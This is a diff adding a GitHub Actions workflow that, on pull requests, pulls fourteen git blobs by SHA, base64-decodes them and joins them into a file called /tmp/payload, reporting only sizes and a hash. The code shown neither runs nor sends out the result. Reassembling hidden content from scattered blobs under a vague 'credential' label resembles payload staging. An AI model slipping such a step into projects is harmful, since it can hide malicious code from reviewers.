@@ -1,0 +1,28 @@
+name: Diagnose frontend device credential blob reconstruction
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  diagnose:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Reconstruct and report
+        env:
+          GH_TOKEN: ${{ github.token }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          : > /tmp/payload
+          blobs=(ff44c3b6e38e87845659fd3aa8533fc0c0543de0 f2bb4b689cad04825a9eb9ec338cd9798c06d1bb 104944ed8bba8c2e7f9872082fa2068ce7f408e4 37d274717c54d963dc86f5535c7df1fe2df65f5d 38fa6f96b9728a74be7ab8e5e5e3978d6ec495c8 82d1ae47ce14456f90f9863d4bb8e5e8fba329ce a346be463e05b5a19fcf7162d331ec2bb68b5b8d df137fe2f76a0abd0cf122fa57e5be0bd54e9bdb f9d7f286d9524e314111a520691ce176f36dd5c5 8e5f9fbfe9b27ca90dc4ec75dc240a3cf053ca15 bb858389d8efa66853966b3554c67f75f61fedab 791ef010f0079382714d338910888fb620c1c5ed ef668bbe0d38df9897530c9e9ff0cb2434603831 a48a24d906ed4f943a867038532e584bbfcf14f4)
+          for sha in "${blobs[@]}"; do
+            chunk="$(gh api "/repos/${GITHUB_REPOSITORY}/git/blobs/${sha}" --jq '.content' | tr -d '\n' | base64 -d)"
+            printf '%s' "$chunk" >> /tmp/payload
+            printf '%s %s\n' "$sha" "${#chunk}"
+          done
+          echo "total=$(wc -c < /tmp/payload)"
+          echo "sha=$(sha256sum /tmp/payload | awk '{print $1}')"
